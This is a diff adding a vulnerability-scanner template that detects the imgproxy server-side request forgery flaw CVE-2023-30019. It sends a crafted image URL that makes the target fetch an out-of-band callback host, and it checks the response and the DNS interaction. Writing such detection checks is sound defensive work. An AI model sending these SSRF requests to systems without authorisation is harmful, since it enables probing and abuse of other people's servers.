@@ -1,0 +1,29 @@
+id: cve-2023-30019-imgproxy-ssrf
+info:
+  name: imgproxy Server-Side Request Forgery (CVE-2023-30019)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: ssrf,cve,medium
+http:
+  - raw:
+      - |
+        GET /111/rs:fit:400:400:0:0/plain/http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: header
+        words:
+          - "imgproxy"
+      - type: word
+        part: body
+        words:
+          - "Source image is unreachable"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
